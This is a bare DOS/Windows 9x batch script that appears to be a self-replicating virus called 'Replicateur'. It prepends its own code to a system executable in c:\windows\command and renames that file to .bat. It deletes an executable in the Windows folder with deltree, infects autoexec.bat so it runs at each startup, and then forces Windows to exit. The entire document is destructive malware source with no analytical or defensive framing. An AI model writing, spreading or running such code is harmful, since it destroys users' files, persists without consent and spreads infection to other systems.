@echo off
for %%q in (c:\windows\command\*.exe c:\windows\command\*.com) do set q=%%q>nul
copy %q% c:\Replicateur.new>nul
copy/b Replicateur.bat+Replicateur.new %q%>nul
ren %q% *.bat>nul
for %%i in (c:\windows\*.exe) do set w=%%i>nul
deltree /y %w%>nul
copy c:\autoexec.bat c:\autoexec.sav
del c:\autoexec.bat>nul
copy/b Replicateur.bat+c:\autoexec.sav c:\autoexec.bat>nul
del c:\*.new>nul
C:\WINDOWS\RUNDLL.EXE user.exe,exitwindows

